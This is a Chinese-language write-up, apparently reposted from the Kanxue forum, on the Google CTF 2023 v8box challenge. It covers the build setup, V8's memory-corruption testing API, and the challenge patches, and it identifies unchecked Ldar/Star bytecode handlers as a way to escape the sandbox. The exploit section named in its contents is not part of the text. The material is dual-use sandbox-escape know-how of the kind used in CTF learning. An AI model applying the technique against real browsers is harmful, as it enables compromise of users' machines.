> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [bbs.kanxue.com](https://bbs.kanxue.com/thread-286857.htm)

> [原创] Google CTF 2023 - v8box

Google CTF 2023 - v8box
=======================

目录

*   [Google CTF 2023 - v8box](#google-ctf-2023---v8box)
*   [环境搭建](#环境搭建)
*   [漏洞分析](#漏洞分析)
*            [patch 分析](#patch分析)
*            [漏洞分析](#漏洞分析-1)
*            [利用思路](#利用思路)
*   [exp](#exp)
*   [参考链接](#参考链接)

环境搭建
====

查看下 build.dockerfile，本地编译一个环境

![](https://bbs.kanxue.com/upload/attach/202505/971428_6XHK2S5665NQ994.png)

```
fetch v8
git switch -d d90d4533b05301e2be813a5f90223f4c6c1bf63d
gclient sync
git apply < ./v8.patch
git apply < ./0001-Protect-chunk-headers-on-the-heap.patch
./tools/dev/v8gen.py x64.release
 
vim ./out.gn/x64.release/args.gn
```

根据附件所给的编译选项，修改 args.gn 的内容

```
# Copyright 2023 Google LLC
#
# Licensed under the Apache License, Version 2.0 (the "License");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
#     https://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an "AS IS" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.
 
is_component_build = false
is_debug = false
target_cpu = "x64"
v8_enable_sandbox = true
v8_enable_backtrace = true
v8_enable_disassembler = true
v8_enable_object_print = true
v8_enable_verify_heap = true
dcheck_always_on = false
v8_jitless = true
v8_enable_maglev = false
v8_enable_turbofan = false
v8_enable_webassembly = false
v8_expose_memory_corruption_api = true
use_goma = false
v8_code_pointer_sandboxing = true
```

继续执行

```
gn gen out.gn/x64.release
ninja -C out.gn/x64.release -j 12 d8
```

留意上方的编译参数，这里的 v8 关闭了 jit、maglev、turbofan、webassembly，然后开启了这个 v8_expose_memory_corruption_api，这个 api 的作用是可以通过官方写的一些函数，对于 sandbox 内的空间进行操作，位于 src/sandbox/testing.cc

```
#ifdef V8_EXPOSE_MEMORY_CORRUPTION_API
 
namespace {
 
// Sandbox.byteLength
void SandboxGetByteLength(const v8::FunctionCallbackInfo& info) {
  DCHECK(ValidateCallbackInfo(info));
  v8::Isolate* isolate = info.GetIsolate();
  double sandbox_size = GetProcessWideSandbox()->size();
  info.GetReturnValue().Set(v8::Number::New(isolate, sandbox_size));
}
 
// new Sandbox.MemoryView(info) -> Sandbox.MemoryView
void SandboxMemoryView(const v8::FunctionCallbackInfo& info) {
  DCHECK(ValidateCallbackInfo(info));
  v8::Isolate* isolate = info.GetIsolate();
  Local context = isolate->GetCurrentContext();
 
  if (!info.IsConstructCall()) {
    isolate->ThrowError("Sandbox.MemoryView must be invoked with 'new'");
    return;
  }
 
  Local arg1, arg2;
  if (!info[0]->ToInteger(context).ToLocal(&arg1) ||
      !info[1]->ToInteger(context).ToLocal(&arg2)) {
    isolate->ThrowError("Expects two number arguments (start offset and size)");
    return;
  }
 
  Sandbox* sandbox = GetProcessWideSandbox();
  CHECK_LE(sandbox->size(), kMaxSafeIntegerUint64);
 
  uint64_t offset = arg1->Value();
  uint64_t size = arg2->Value();
  if (offset > sandbox->size() || size > sandbox->size() ||
      (offset + size) > sandbox->size()) {
    isolate->ThrowError(
        "The MemoryView must be entirely contained within the sandbox");
    return;
  }
 
  Factory* factory = reinterpret_cast(isolate)->factory();
  std::unique_ptr memory = BackingStore::WrapAllocation(
      reinterpret_cast(sandbox->base() + offset), size,
      v8::BackingStore::EmptyDeleter, nullptr, SharedFlag::kNotShared);
  if (!memory) {
    isolate->ThrowError("Out of memory: MemoryView backing store");
    return;
  }
  Handle buffer = factory->NewJSArrayBuffer(std::move(memory));
  info.GetReturnValue().Set(Utils::ToLocal(buffer));
}
 
// Sandbox.getAddressOf(object) -> Number
void SandboxGetAddressOf(const v8::FunctionCallbackInfo& info) {
  DCHECK(ValidateCallbackInfo(info));
  v8::Isolate* isolate = info.GetIsolate();
 
  if (info.Length() == 0) {
    isolate->ThrowError("First argument must be provided");
    return;
  }
 
  Handle arg = Utils::OpenHandle(*info[0]);
  if (!arg->IsHeapObject()) {
    isolate->ThrowError("First argument must be a HeapObject");
    return;
  }
 
  // HeapObjects must be allocated inside the pointer compression cage so their
  // address relative to the start of the sandbox can be obtained simply by
  // taking the lowest 32 bits of the absolute address.
  uint32_t address = static_cast(HeapObject::cast(*arg).address());
  info.GetReturnValue().Set(v8::Integer::NewFromUnsigned(isolate, address));
}
 
// Sandbox.getSizeOf(object) -> Number
void SandboxGetSizeOf(const v8::FunctionCallbackInfo& info) {
  DCHECK(ValidateCallbackInfo(info));
  v8::Isolate* isolate = info.GetIsolate();
 
  if (info.Length() == 0) {
    isolate->ThrowError("First argument must be provided");
    return;
  }
 
  Handle arg = Utils::OpenHandle(*info[0]);
  if (!arg->IsHeapObject()) {
    isolate->ThrowError("First argument must be a HeapObject");
    return;
  }
 
  int size = HeapObject::cast(*arg).Size();
  info.GetReturnValue().Set(v8::Integer::New(isolate, size));
}
 
Handle NewFunctionTemplate(
    Isolate* isolate, FunctionCallback func,
    ConstructorBehavior constructor_behavior) {
  // Use the API functions here as they are more convenient to use.
  v8::Isolate* api_isolate = reinterpret_cast(isolate);
  Local function_template =
      FunctionTemplate::New(api_isolate, func, {}, {}, 0, constructor_behavior,
                            SideEffectType::kHasSideEffect);
  return v8::Utils::OpenHandle(*function_template);
}
 
Handle CreateFunc(Isolate* isolate, FunctionCallback func,
                              Handle name, bool is_constructor) {
  ConstructorBehavior constructor_behavior = is_constructor
                                                 ? ConstructorBehavior::kAllow
                                                 : ConstructorBehavior::kThrow;
  Handle function_template =
      NewFunctionTemplate(isolate, func, constructor_behavior);
  return ApiNatives::InstantiateFunction(function_template, name)
      .ToHandleChecked();
}
 
void InstallFunc(Isolate* isolate, Handle holder,
                 FunctionCallback func, const char* name, int num_parameters,
                 bool is_constructor) {
  Factory* factory = isolate->factory();
  Handle function_name = factory->NewStringFromAsciiChecked(name);
  Handle function =
      CreateFunc(isolate, func, function_name, is_constructor);
  function->shared().set_length(num_parameters);
  JSObject::AddProperty(isolate, holder, function_name, function, NONE);
}
 
void InstallGetter(Isolate* isolate, Handle object,
                   FunctionCallback func, const char* name) {
  Factory* factory = isolate->factory();
  Handle property_name = factory->NewStringFromAsciiChecked(name);
  Handle getter = CreateFunc(isolate, func, property_name, false);
  Handle setter = factory->null_value();
  JSObject::DefineOwnAccessorIgnoreAttributes(object, property_name, getter,
                                              setter, FROZEN);
}
 
void InstallFunction(Isolate* isolate, Handle holder,
                     FunctionCallback func, const char* name,
                     int num_parameters) {
  InstallFunc(isolate, holder, func, name, num_parameters, false);
}
 
void InstallConstructor(Isolate* isolate, Handle holder,
                        FunctionCallback func, const char* name,
                        int num_parameters) {
  InstallFunc(isolate, holder, func, name, num_parameters, true);
}
 
}  // namespace
 
void SandboxTesting::InstallMemoryCorruptionApi(Isolate* isolate) {
  CHECK(GetProcessWideSandbox()->is_initialized());
 
#ifndef V8_EXPOSE_MEMORY_CORRUPTION_API
#error "This function should not be available in any shipping build "          \
       "where it could potentially be abused to facilitate exploitation."
#endif
 
  Factory* factory = isolate->factory();
 
  // Create the special Sandbox object that provides read/write access to the
  // sandbox address space alongside other miscellaneous functionality.
  Handle sandbox =
      factory->NewJSObject(isolate->object_function(), AllocationType::kOld);
 
  InstallGetter(isolate, sandbox, SandboxGetByteLength, "byteLength");
  InstallConstructor(isolate, sandbox, SandboxMemoryView, "MemoryView", 2);
  InstallFunction(isolate, sandbox, SandboxGetAddressOf, "getAddressOf", 1);
  InstallFunction(isolate, sandbox, SandboxGetSizeOf, "getSizeOf", 1);
 
  // Install the Sandbox object as property on the global object.
  Handle global = isolate->global_object();
  Handle name = factory->NewStringFromAsciiChecked("Sandbox");
  JSObject::AddProperty(isolate, global, name, sandbox, DONT_ENUM);
}
 
#endif  // V8_EXPOSE_MEMORY_CORRUPTION_API 
```

有以下方法，相当于是直接有了 oob 原语。

```
Sandbox.byteLength
new Sandbox.MemoryView(info) -> Sandbox.MemoryView
Sandbox.getAddressOf(object) -> Number
Sandbox.getSizeOf(object) -> Number
```

后来查阅了新版本，大致是 v8 12.x 以上的，新增了一些方法，同时编译选项也发生了一些变化，变成了`V8_ENABLE_MEMORY_CORRUPTION_API`，同时多出了一些方法，见下方

```
void SandboxTesting::InstallMemoryCorruptionApi(Isolate* isolate) {
#ifndef V8_ENABLE_MEMORY_CORRUPTION_API
#error "This function should not be available in any shipping build "          \
       "where it could potentially be abused to facilitate exploitation."
#endif
 
  CHECK(Sandbox::current()->is_initialized());
 
  // Create the special Sandbox object that provides read/write access to the
  // sandbox address space alongside other miscellaneous functionality.
  Handle sandbox = isolate->factory()->NewJSObject(
      isolate->object_function(), AllocationType::kOld);
 
  InstallGetter(isolate, sandbox, SandboxGetBase, "base");
  InstallGetter(isolate, sandbox, SandboxGetByteLength, "byteLength");
  InstallConstructor(isolate, sandbox, SandboxMemoryView, "MemoryView", 2);
  InstallFunction(isolate, sandbox, SandboxGetAddressOf, "getAddressOf", 1);
  InstallFunction(isolate, sandbox, SandboxGetObjectAt, "getObjectAt", 1);
  InstallFunction(isolate, sandbox, SandboxIsValidObjectAt, "isValidObjectAt",
                  1);
  InstallFunction(isolate, sandbox, SandboxIsWritable, "isWritable", 1);
  InstallFunction(isolate, sandbox, SandboxIsWritableObjectAt,
                  "isWritableObjectAt", 1);
  InstallFunction(isolate, sandbox, SandboxGetSizeOf, "getSizeOf", 1);
  InstallFunction(isolate, sandbox, SandboxGetSizeOfObjectAt,
                  "getSizeOfObjectAt", 1);
  InstallFunction(isolate, sandbox, SandboxGetInstanceTypeOf,
                  "getInstanceTypeOf", 1);
  InstallFunction(isolate, sandbox, SandboxGetInstanceTypeOfObjectAt,
                  "getInstanceTypeOfObjectAt", 1);
  InstallFunction(isolate, sandbox, SandboxGetInstanceTypeIdOf,
                  "getInstanceTypeIdOf", 1);
  InstallFunction(isolate, sandbox, SandboxGetInstanceTypeIdOfObjectAt,
                  "getInstanceTypeIdOfObjectAt", 1);
  InstallFunction(isolate, sandbox, SandboxGetInstanceTypeIdFor,
                  "getInstanceTypeIdFor", 1);
  InstallFunction(isolate, sandbox, SandboxGetFieldOffset, "getFieldOffset", 2);
 
  // Install the Sandbox object as property on the global object.
  Handle global = isolate->global_object();
  Handle name =
      isolate->factory()->NewStringFromAsciiChecked("Sandbox");
  JSObject::AddProperty(isolate, global, name, sandbox, DONT_ENUM);
}
 
#endif  // V8_ENABLE_MEMORY_CORRUPTION_API 
```

同时开启了这个编译选项`v8_code_pointer_sandboxing`，实现的 [issue id](elink@c7eK9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6K6L8%4g2J5j5$3g2Q4x3X3g2U0K9s2u0G2L8h3W2#2L8g2)9J5k6h3!0J5k6#2)9J5c8X3y4Z5M7X3!0E0K9i4g2E0i4K6u0r3i4K6g2X3i4K6u0r3j5$3S2J5L8$3#2A6N6h3#2Q4x3V1k6$3z5q4)9J5c8Y4j5^5i4K6u0W2k6$3W2@1i4K6u0r3i4K6u0n7i4K6u0r3k6h3f1@1z5o6V1J5y4U0p5H3y4U0l9#2x3h3q4X3j5U0M7^5y4r3b7^5k6U0x3&6j5K6x3I4j5h3q4T1x3r3b7J5j5e0l9@1z5o6t1K6k6R3`.`.)。因为我们此时已经又了 4GB 空间任意读写，所以如果修改了某些函数指针的值，是可以很容易的控制 rip，所以这个保护就是来阻止这种行为。对于可执行的函数指针，都会有一个固定的入口（code pointer table），然后根据偏移来索引对应的代码。

漏洞分析
====

patch 分析
--------

下面是 v8.patch 的内容

```
# Copyright 2023 Google LLC
#
# Licensed under the Apache License, Version 2.0 (the "License");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
#     https://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an "AS IS" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.
diff --git a/src/d8/d8.cc b/src/d8/d8.cc
index 7c57acde43..652aa480dd 100644
--- a/src/d8/d8.cc
+++ b/src/d8/d8.cc
@@ -3336,6 +3336,7 @@ static void AccessIndexedEnumerator(const PropertyCallbackInfo& info) {}
 
 Local Shell::CreateGlobalTemplate(Isolate* isolate) {
   Local global_template = ObjectTemplate::New(isolate);
+  if (/* DISABLES CODE */ (false)) {
   global_template->Set(Symbol::GetToStringTag(isolate),
                        String::NewFromUtf8Literal(isolate, "global"));
   global_template->Set(isolate, "version",
@@ -3358,8 +3359,10 @@ Local Shell::CreateGlobalTemplate(Isolate* isolate) {
                        FunctionTemplate::New(isolate, ReadLine));
   global_template->Set(isolate, "load",
                        FunctionTemplate::New(isolate, ExecuteFile));
+  }
   global_template->Set(isolate, "setTimeout",
                        FunctionTemplate::New(isolate, SetTimeout));
+  if (/* DISABLES CODE */ (false)) {
   // Some Emscripten-generated code tries to call 'quit', which in turn would
   // call C's exit(). This would lead to memory leaks, because there is no way
   // we can terminate cleanly then, so we need a way to hide 'quit'.
@@ -3390,6 +3393,7 @@ Local Shell::CreateGlobalTemplate(Isolate* isolate) {
     global_template->Set(isolate, "async_hooks",
                          Shell::CreateAsyncHookTemplate(isolate));
   }
+  }
 
   if (options.throw_on_failed_access_check ||
       options.noop_on_failed_access_check) { 
```

找到对应的源码看下，这里关掉了一些 d8 的选项，为了编译更轻量化？

```
Local Shell::CreateGlobalTemplate(Isolate* isolate) {
  Local global_template = ObjectTemplate::New(isolate);
  if (/* DISABLES CODE */ (false)) {
  global_template->Set(Symbol::GetToStringTag(isolate),
                       String::NewFromUtf8Literal(isolate, "global"));
  global_template->Set(isolate, "version",
                       FunctionTemplate::New(isolate, Version));
 
  global_template->Set(isolate, "print", FunctionTemplate::New(isolate, Print));
  global_template->Set(isolate, "printErr",
                       FunctionTemplate::New(isolate, PrintErr));
  global_template->Set(isolate, "write",
                       FunctionTemplate::New(isolate, WriteStdout));
  if (!i::v8_flags.fuzzing) {
    global_template->Set(isolate, "writeFile",
                         FunctionTemplate::New(isolate, WriteFile));
  }
  global_template->Set(isolate, "read",
                       FunctionTemplate::New(isolate, ReadFile));
  global_template->Set(isolate, "readbuffer",
                       FunctionTemplate::New(isolate, ReadBuffer));
  global_template->Set(isolate, "readline",
                       FunctionTemplate::New(isolate, ReadLine));
  global_template->Set(isolate, "load",
                       FunctionTemplate::New(isolate, ExecuteFile));
  }
  global_template->Set(isolate, "setTimeout",
                       FunctionTemplate::New(isolate, SetTimeout));
  if (/* DISABLES CODE */ (false)) {
  // Some Emscripten-generated code tries to call 'quit', which in turn would
  // call C's exit(). This would lead to memory leaks, because there is no way
  // we can terminate cleanly then, so we need a way to hide 'quit'.
  if (!options.omit_quit) {
    global_template->Set(isolate, "quit", FunctionTemplate::New(isolate, Quit));
  }
  global_template->Set(isolate, "testRunner",
                       Shell::CreateTestRunnerTemplate(isolate));
  global_template->Set(isolate, "Realm", Shell::CreateRealmTemplate(isolate));
  global_template->Set(isolate, "performance",
                       Shell::CreatePerformanceTemplate(isolate));
  global_template->Set(isolate, "Worker", Shell::CreateWorkerTemplate(isolate));
 
  // Prevent fuzzers from creating side effects.
  if (!i::v8_flags.fuzzing) {
    global_template->Set(isolate, "os", Shell::CreateOSTemplate(isolate));
  }
  global_template->Set(isolate, "d8", Shell::CreateD8Template(isolate));
 
#ifdef V8_FUZZILLI
  global_template->Set(
      String::NewFromUtf8(isolate, "fuzzilli", NewStringType::kNormal)
          .ToLocalChecked(),
      FunctionTemplate::New(isolate, Fuzzilli), PropertyAttribute::DontEnum);
#endif  // V8_FUZZILLI
 
  if (i::v8_flags.expose_async_hooks) {
    global_template->Set(isolate, "async_hooks",
                         Shell::CreateAsyncHookTemplate(isolate));
  }
  } 
```

接着是 0001-Protect-chunk-headers-on-the-heap.patch 的内容

```
# Copyright 2023 Google LLC
#
# Licensed under the Apache License, Version 2.0 (the "License");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
#     https://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an "AS IS" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.
diff --git a/src/common/code-memory-access-inl.h b/src/common/code-memory-access-inl.h
index 4b8ac2e5c7..58542dc4e5 100644
--- a/src/common/code-memory-access-inl.h
+++ b/src/common/code-memory-access-inl.h
@@ -17,6 +17,18 @@
 namespace v8 {
 namespace internal {
 
+RwMemoryWriteScope::RwMemoryWriteScope() {
+  SetWritable();
+}
+
+RwMemoryWriteScope::RwMemoryWriteScope(const char *comment) {
+  SetWritable();
+}
+
+RwMemoryWriteScope::~RwMemoryWriteScope() {
+  SetReadOnly();
+}
+
 RwxMemoryWriteScope::RwxMemoryWriteScope(const char* comment) {
   if (!v8_flags.jitless) {
     SetWritable();
diff --git a/src/common/code-memory-access.cc b/src/common/code-memory-access.cc
index be3b9741d2..b8c59c331f 100644
--- a/src/common/code-memory-access.cc
+++ b/src/common/code-memory-access.cc
@@ -4,6 +4,10 @@
 
 #include "src/common/code-memory-access-inl.h"
 #include "src/utils/allocation.h"
+#include "src/common/globals.h"
+#include "src/execution/isolate-inl.h"
+
+#include namespace v8 {
 namespace internal {
@@ -11,6 +15,68 @@ namespace internal {
 ThreadIsolation::TrustedData ThreadIsolation::trusted_data_;
 ThreadIsolation::UntrustedData ThreadIsolation::untrusted_data_;
 
+thread_local int RwMemoryWriteScope::nesting_level_ = 0;
+
+static void ProtectSpace(Space *space, int prot) {
+  if (space->memory_chunk_list().Empty()) {
+    return;
+  }
+
+  MemoryChunk *c = space->memory_chunk_list().front();
+  while (c) {
+    void *addr = reinterpret_cast(c->address());
+    // printf("making %p read-only\n", addr);
+    CHECK(mprotect(addr, RoundDown(sizeof(MemoryChunk), 0x1000), prot) == 0);
+    c = c->list_node().next();
+  }
+}
+
+// static
+void RwMemoryWriteScope::SetWritable() {
+  if (nesting_level_ == 0) {
+    int prot = PROT_READ | PROT_WRITE;
+    Isolate *isolate = Isolate::Current();
+    for (int i = FIRST_MUTABLE_SPACE; i < LAST_SPACE; i++) {
+      Space *space = isolate->heap()->space(i);
+      if (space == nullptr) {
+        continue;
+      }
+
+      if (!v8_flags.minor_mc && i == NEW_SPACE) {
+        SemiSpaceNewSpace* semi_space_new_space = SemiSpaceNewSpace::From(static_cast(space));
+        ProtectSpace(&semi_space_new_space->from_space(), prot);
+        ProtectSpace(&semi_space_new_space->to_space(), prot);
+      } else {
+        ProtectSpace(space, prot);
+      }
+    }
+  }
+  nesting_level_++;
+}
+
+// static
+void RwMemoryWriteScope::SetReadOnly() {
+  nesting_level_--;
+  if (nesting_level_ == 0) {
+    int prot = PROT_READ;
+    Isolate *isolate = Isolate::Current();
+    for (int i = FIRST_MUTABLE_SPACE; i < LAST_SPACE; i++) {
+      Space *space = isolate->heap()->space(i);
+      if (space == nullptr) {
+        continue;
+      }
+
+      if (!v8_flags.minor_mc && i == NEW_SPACE) {
+        SemiSpaceNewSpace* semi_space_new_space = SemiSpaceNewSpace::From(static_cast(space));
+        ProtectSpace(&semi_space_new_space->from_space(), prot);
+        ProtectSpace(&semi_space_new_space->to_space(), prot);
+      } else {
+        ProtectSpace(space, prot);
+      }
+    }
+  }
+}
+
 #if V8_HAS_PTHREAD_JIT_WRITE_PROTECT || V8_HAS_PKU_JIT_WRITE_PROTECT
 thread_local int RwxMemoryWriteScope::code_space_write_nesting_level_ = 0;
 #endif  // V8_HAS_PTHREAD_JIT_WRITE_PROTECT || V8_HAS_PKU_JIT_WRITE_PROTECT
diff --git a/src/common/code-memory-access.h b/src/common/code-memory-access.h
index e90dcc9a64..4e835c87c7 100644
--- a/src/common/code-memory-access.h
+++ b/src/common/code-memory-access.h
@@ -331,6 +331,22 @@ class V8_NODISCARD RwxMemoryWriteScope {
 #endif  // V8_HAS_PTHREAD_JIT_WRITE_PROTECT || V8_HAS_PKU_JIT_WRITE_PROTECT
 };
 
+class V8_NODISCARD RwMemoryWriteScope final {
+ public:
+  V8_INLINE RwMemoryWriteScope();
+  V8_INLINE explicit RwMemoryWriteScope(const char *comment);
+  V8_INLINE ~RwMemoryWriteScope();
+
+  RwMemoryWriteScope(const RwMemoryWriteScope&) = delete;
+  RwMemoryWriteScope& operator=(const RwMemoryWriteScope&) = delete;
+
+ private:
+  static void SetWritable();
+  static void SetReadOnly();
+
+  static thread_local int nesting_level_;
+};
+
 // This class is a no-op version of the RwxMemoryWriteScope class above.
 // It's used as a target type for other scope type definitions when a no-op
 // semantics is required.
@@ -346,7 +362,7 @@ using CodePageMemoryModificationScopeForPerf = RwxMemoryWriteScope;
 #else
 // Without per-thread write permissions, we only use permission switching for
 // debugging and the perf impact of this doesn't matter.
-using CodePageMemoryModificationScopeForPerf = NopRwxMemoryWriteScope;
+using CodePageMemoryModificationScopeForPerf = RwMemoryWriteScope;
 #endif
 
 // Same as the RwxMemoryWriteScope but without inlining the code.
diff --git a/src/execution/isolate.cc b/src/execution/isolate.cc
index c935c8c5ca..2534b7bc2e 100644
--- a/src/execution/isolate.cc
+++ b/src/execution/isolate.cc
@@ -61,6 +61,7 @@
 #include "src/handles/persistent-handles.h"
 #include "src/heap/heap-inl.h"
 #include "src/heap/heap-verifier.h"
+#include "src/heap/heap.h"
 #include "src/heap/local-heap-inl.h"
 #include "src/heap/parked-scope.h"
 #include "src/heap/read-only-heap.h"
@@ -4236,6 +4237,8 @@ void Isolate::VerifyStaticRoots() {
 bool Isolate::Init(SnapshotData* startup_snapshot_data,
                    SnapshotData* read_only_snapshot_data,
                    SnapshotData* shared_heap_snapshot_data, bool can_rehash) {
+  CodePageHeaderModificationScope scope{};
+
   TRACE_ISOLATE(init);
 
 #ifdef V8_COMPRESS_POINTERS_IN_SHARED_CAGE
diff --git a/src/heap/heap.cc b/src/heap/heap.cc
index 4d7c611dfd..d3027dd3b2 100644
--- a/src/heap/heap.cc
+++ b/src/heap/heap.cc
@@ -1748,6 +1748,8 @@ void Heap::CollectGarbage(AllocationSpace space,
 
   DCHECK(AllowGarbageCollection::IsAllowed());
 
+  CodePageHeaderModificationScope hsm{};
+
   const char* collector_reason = nullptr;
   const GarbageCollector collector =
       SelectGarbageCollector(space, gc_reason, &collector_reason);
diff --git a/src/heap/heap.h b/src/heap/heap.h
index 6675b09348..67772961fe 100644
--- a/src/heap/heap.h
+++ b/src/heap/heap.h
@@ -2537,7 +2537,10 @@ class V8_NODISCARD AlwaysAllocateScopeForTesting {
 // scope.
 #if V8_HEAP_USE_PTHREAD_JIT_WRITE_PROTECT
 using CodePageHeaderModificationScope = RwxMemoryWriteScope;
+#elif defined(V8_JITLESS)
+using CodePageHeaderModificationScope = RwMemoryWriteScope;
 #else
+#error "JIT not supported"
 // When write protection of code page headers is not required the scope is
 // a no-op.
 using CodePageHeaderModificationScope = NopRwxMemoryWriteScope;
@@ -2560,6 +2563,7 @@ class V8_NODISCARD CodePageMemoryModificationScope {
   bool scope_active_;
   base::Optional guard_;
 #endif
+  RwMemoryWriteScope header_scope_;
 
   // Disallow any GCs inside this scope, as a relocation of the underlying
   // object would change the {MemoryChunk} that this scope targets.
diff --git a/src/heap/memory-chunk.cc b/src/heap/memory-chunk.cc
index 0fc34c12a1..479993b219 100644
--- a/src/heap/memory-chunk.cc
+++ b/src/heap/memory-chunk.cc
@@ -10,6 +10,7 @@
 #include "src/common/globals.h"
 #include "src/heap/basic-memory-chunk.h"
 #include "src/heap/code-object-registry.h"
+#include "src/heap/heap.h"
 #include "src/heap/marking-state-inl.h"
 #include "src/heap/memory-allocator.h"
 #include "src/heap/memory-chunk-inl.h"
@@ -223,6 +224,7 @@ void MemoryChunk::ReleaseAllAllocatedMemory() {
 }
 
 SlotSet* MemoryChunk::AllocateSlotSet(RememberedSetType type) {
+  CodePageHeaderModificationScope scope{};
   SlotSet* new_slot_set = SlotSet::Allocate(buckets());
   SlotSet* old_slot_set = base::AsAtomicPointer::AcquireRelease_CompareAndSwap(
       &slot_set_[type], nullptr, new_slot_set);
diff --git a/src/heap/paged-spaces.cc b/src/heap/paged-spaces.cc
index 6083c2a420..5b6d7c965e 100644
--- a/src/heap/paged-spaces.cc
+++ b/src/heap/paged-spaces.cc
@@ -311,6 +311,9 @@ void PagedSpaceBase::SetTopAndLimit(Address top, Address limit, Address end) {
   DCHECK_GE(end, limit);
   DCHECK(top == limit ||
          Page::FromAddress(top) == Page::FromAddress(limit - 1));
+
+  CodePageHeaderModificationScope scope{};
+
   BasicMemoryChunk::UpdateHighWaterMark(allocation_info_.top());
   allocation_info_.Reset(top, limit);
 
@@ -814,6 +817,7 @@ void PagedSpaceBase::UpdateInlineAllocationLimit() {
 // OldSpace implementation
 
 bool PagedSpaceBase::RefillLabMain(int size_in_bytes, AllocationOrigin origin) {
+  CodePageHeaderModificationScope scope("RefillLabMain");
   VMState state(heap()->isolate());
   RCS_SCOPE(heap()->isolate(),
             RuntimeCallCounterId::kGC_Custom_SlowAllocateRaw); 
```

先创建了三个方法

```
+RwMemoryWriteScope::RwMemoryWriteScope() {
+  SetWritable();
+}
+
+RwMemoryWriteScope::RwMemoryWriteScope(const char *comment) {
+  SetWritable();
+}
+
+RwMemoryWriteScope::~RwMemoryWriteScope() {
+  SetReadOnly();
+}
+
```

下面在 RwMemoryWriteScope 命名空间下新增了三个方法，分别是 ProtectSpace、SetWritable、SetReadOnly。

ProtectSpace 的作用是将一段地址赋为指定的权限，核心是这里 mprotect(addr, RoundDown(sizeof(MemoryChunk), 0x1000), prot)，就是熟悉的权限修改。

SetWritable 的作用是将当前的地址空间赋为 rw 权限，需要注意其处理，对于 young generation 且没有被 gc 处理过的内存空间，会将 from_space 和 to_space 的地址空间权限赋为 rw，反之就是已经处理过的 old generaion 直接调用 ProtectSpace 去赋权限；SetReadOnly 的作用同理，结构和 SetWritable 是一样的。

这里其实就已经存在了一个条件竞争的问题，两个函数使用了 nesting_level_变量来约束，但是对于多线程的情况其实就会出现问题，但这个并不是预期解法。

```
+thread_local int RwMemoryWriteScope::nesting_level_ = 0;
+
+static void ProtectSpace(Space *space, int prot) {
+  if (space->memory_chunk_list().Empty()) {
+    return;
+  }
+
+  MemoryChunk *c = space->memory_chunk_list().front();
+  while (c) {
+    void *addr = reinterpret_cast(c->address());
+    // printf("making %p read-only\n", addr);
+    CHECK(mprotect(addr, RoundDown(sizeof(MemoryChunk), 0x1000), prot) == 0);
+    c = c->list_node().next();
+  }
+}
+
+// static
+void RwMemoryWriteScope::SetWritable() {
+  if (nesting_level_ == 0) {
+    int prot = PROT_READ | PROT_WRITE;
+    Isolate *isolate = Isolate::Current();
+    for (int i = FIRST_MUTABLE_SPACE; i < LAST_SPACE; i++) {
+      Space *space = isolate->heap()->space(i);
+      if (space == nullptr) {
+        continue;
+      }
+
+      if (!v8_flags.minor_mc && i == NEW_SPACE) {
+        SemiSpaceNewSpace* semi_space_new_space = SemiSpaceNewSpace::From(static_cast(space));
+        ProtectSpace(&semi_space_new_space->from_space(), prot);
+        ProtectSpace(&semi_space_new_space->to_space(), prot);
+      } else {
+        ProtectSpace(space, prot);
+      }
+    }
+  }
+  nesting_level_++;
+}
+
+// static
+void RwMemoryWriteScope::SetReadOnly() {
+  nesting_level_--;
+  if (nesting_level_ == 0) {
+    int prot = PROT_READ;
+    Isolate *isolate = Isolate::Current();
+    for (int i = FIRST_MUTABLE_SPACE; i < LAST_SPACE; i++) {
+      Space *space = isolate->heap()->space(i);
+      if (space == nullptr) {
+        continue;
+      }
+
+      if (!v8_flags.minor_mc && i == NEW_SPACE) {
+        SemiSpaceNewSpace* semi_space_new_space = SemiSpaceNewSpace::From(static_cast(space));
+        ProtectSpace(&semi_space_new_space->from_space(), prot);
+        ProtectSpace(&semi_space_new_space->to_space(), prot);
+      } else {
+        ProtectSpace(space, prot);
+      }
+    }
+  }
+}
+ 
```

漏洞分析
----

Ignition 作为 v8 的字节码解释器，JavaScripts 代码会被转化为字节码，然后字节码通过 Ignition 解释执行，所以即使 Maglev/Jit 关闭，也不会影响到 Ignition。

Ignition 会从字节码数组中读取指令执行，这些字节码通常是从源代码编译而来的，所以通过修改这些字节码数组的内容，可以实现指令的执行，但是要如何实现沙箱逃逸呢？

v8 的 js 解释器定义了一些 [opcode](elink@693K9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6K6L8%4g2J5j5$3g2Q4x3X3g2U0K9s2u0G2L8h3W2#2L8g2)9J5k6h3!0J5k6#2)9J5c8X3y4Z5M7X3!0E0K9i4g2E0i4K6u0r3j5$3S2J5L8$3#2A6N6h3#2Q4x3V1k6K6M7X3y4Q4x3V1k6Q4x3V1u0Q4x3V1k6J5k6h3k6K6i4K6u0r3K9r3g2S2k6s2y4Q4x3V1k6E0j5h3W2F1i4K6y4m8N6U0S2Q4x3V1k6K6M7X3y4Q4x3V1k6A6L8Y4c8W2M7Y4m8J5k6i4c8W2M7W2)9J5c8X3u0&6N6r3g2U0L8$3c8W2M7#2)9J5k6h3S2Q4x3@1u0D9i4K6y4p5y4o6g2Q4x3@1u0V1M7X3y4Q4x3@1b7J5x3o6V1I4x3h3k6X3k6o6S2S2x3r3f1I4y4U0x3$3z5o6l9I4k6r3c8X3x3K6l9K6j5K6p5%4x3K6M7#2k6X3c8W2k6r3j5&6j5K6R3K6)，这些其中 Ldar 和 Star 出现了缺乏边界检查的问题，我们可以利用这两个实现沙箱逃逸

